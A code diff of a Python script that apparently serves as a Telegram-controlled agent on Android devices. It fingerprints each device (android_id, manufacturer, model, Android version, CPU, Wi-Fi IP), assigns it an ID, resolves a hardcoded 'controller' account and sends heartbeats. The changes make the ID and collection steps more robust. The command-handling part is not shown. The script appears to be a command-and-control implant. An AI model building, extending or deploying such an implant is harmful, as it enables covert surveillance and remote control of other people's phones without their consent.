@@ -3,7 +3,8 @@ import os
 import subprocess
 import sys
 import traceback
-import uuid
+import random
+import string
 from telethon import TelegramClient, events
 
 API_ID = 3910389
@@ -18,47 +19,58 @@ CONTROLLER_ENTITY = None
 DEVICE_ID = "UNKNOWN"
 DEVICE_MODEL = "UNKNOWN"
 
-def run_cmd(cmd):
-    try:
-        return subprocess.check_output(cmd, shell=True, stderr=subprocess.DEVNULL).decode().strip()
-    except Exception:
-        return ""
-
 def get_device_info():
     global DEVICE_ID, DEVICE_MODEL
+    
+    # 1. Read existing ID if valid
     try:
         if os.path.exists(ID_FILE):
             with open(ID_FILE, 'r') as f:
-                DEVICE_ID = f.read().strip()
+                saved_id = f.read().strip()
+                if saved_id and saved_id != "P-err" and saved_id != "UNKNOWN":
+                    DEVICE_ID = saved_id
+    except Exception:
+        pass
+
+    # 2. Generate new ID if needed
+    if DEVICE_ID == "UNKNOWN" or DEVICE_ID == "P-err":
+        and_id = ""
+        try:
+            and_id = subprocess.check_output(['/system/bin/settings', 'get', 'secure', 'android_id'], stderr=subprocess.DEVNULL).decode().strip()
+        except Exception:
+            pass
         
-        if not DEVICE_ID or DEVICE_ID == "P-err" or DEVICE_ID == "UNKNOWN":
-            and_id = run_cmd('/system/bin/settings get secure android_id')
-            if not and_id or and_id.startswith('Exception'):
-                and_id = run_cmd('settings get secure android_id')
-            
-            if not and_id or and_id.startswith('Exception'):
-                and_id = uuid.uuid4().hex[:4]
+        if not and_id or and_id.startswith('Exception') or and_id == 'null' or len(and_id) < 4:
+            try:
+                and_id = subprocess.check_output(['settings', 'get', 'secure', 'android_id'], stderr=subprocess.DEVNULL).decode().strip()
+            except Exception:
+                pass
                 
-            DEVICE_ID = f"P-{and_id[:4]}"
+        if not and_id or and_id.startswith('Exception') or and_id == 'null' or len(and_id) < 4:
+            # Absolute fallback to random 4 characters
+            and_id = ''.join(random.choices(string.ascii_lowercase + string.digits, k=4))
+        
+        DEVICE_ID = f"P-{and_id[:4]}"
+        try:
             with open(ID_FILE, 'w') as f:
                 f.write(DEVICE_ID)
-        
-        DEVICE_MODEL = run_cmd('/system/bin/getprop ro.product.model')
-        if not DEVICE_MODEL:
-            DEVICE_MODEL = run_cmd('getprop ro.product.model')
-        if not DEVICE_MODEL:
-            DEVICE_MODEL = "Unknown"
+        except Exception:
+            pass
             
+    # 3. Get Model
+    try:
+        model = subprocess.check_output(['/system/bin/getprop', 'ro.product.model'], stderr=subprocess.DEVNULL).decode().strip()
+        if not model:
+            model = subprocess.check_output(['getprop', 'ro.product.model'], stderr=subprocess.DEVNULL).decode().strip()
+        DEVICE_MODEL = model if model and not model.startswith('Exception') else "Unknown"
     except Exception:
-        DEVICE_ID = "P-" + uuid.uuid4().hex[:4]
         DEVICE_MODEL = "Unknown"
 
 async def resolve_controller():
     global CONTROLLER_ENTITY
     try:
         CONTROLLER_ENTITY = await client.get_entity(CONTROLLER_USERNAME)
-    except Exception as e:
-        print(f"[-] Resolution failed: {e}")
+    except Exception:
         CONTROLLER_ENTITY = None
 
 async def heartbeat():
@@ -75,22 +87,22 @@ async def heartbeat():
 
 def get_full_details():
     try:
-        man = run_cmd('/system/bin/getprop ro.product.manufacturer')
-        mod = run_cmd('/system/bin/getprop ro.product.model')
-        brand = run_cmd('/system/bin/getprop ro.product.brand')
-        prod = run_cmd('/system/bin/getprop ro.product.name')
-        android = run_cmd('/system/bin/getprop ro.build.version.release')
-        cpu = run_cmd('/system/bin/getprop ro.product.cpu.abi')
+        man = subprocess.check_output(['/system/bin/getprop', 'ro.product.manufacturer'], stderr=subprocess.DEVNULL).decode().strip() or "Unknown"
+        mod = subprocess.check_output(['/system/bin/getprop', 'ro.product.model'], stderr=subprocess.DEVNULL).decode().strip() or "Unknown"
+        brand = subprocess.check_output(['/system/bin/getprop', 'ro.product.brand'], stderr=subprocess.DEVNULL).decode().strip() or "Unknown"
+        prod = subprocess.check_output(['/system/bin/getprop', 'ro.product.name'], stderr=subprocess.DEVNULL).decode().strip() or "Unknown"
+        android = subprocess.check_output(['/system/bin/getprop', 'ro.build.version.release'], stderr=subprocess.DEVNULL).decode().strip() or "Unknown"
+        cpu = subprocess.check_output(['/system/bin/getprop', 'ro.product.cpu.abi'], stderr=subprocess.DEVNULL).decode().strip() or "Unknown"
         
         ip = "127.0.0.1"
-        ip_out = run_cmd('ip addr show wlan0')
-        if not ip_out:
-            ip_out = run_cmd('ifconfig wlan0')
-            
-        for line in ip_out.split('\n'):
-            if 'inet ' in line:
-                ip = line.split('inet ')[1].split(' ')[0].split('/')[0]
-                break
+        try:
+            ip_out = subprocess.check_output(['ip', 'addr', 'show', 'wlan0'], stderr=subprocess.DEVNULL).decode().strip()
+            for line in ip_out.split('\n'):
+                if 'inet ' in line:
+                    ip = line.split('inet ')[1].split(' ')[0].split('/')[0]
+                    break
+        except Exception:
+            pass
                 
         return (f"DEVICE DETAILS • {DEVICE_ID}\n"
                 f"━━━━━━━━━━━━━━━━\n"
@@ -156,6 +168,7 @@ async def main():
     get_device_info()
     await client.start()
     await resolve_controller()
+    print(f"[*] Device ID: {DEVICE_ID} | Model: {DEVICE_MODEL}")
     asyncio.create_task(heartbeat())
     await client.run_until_disconnected()
 
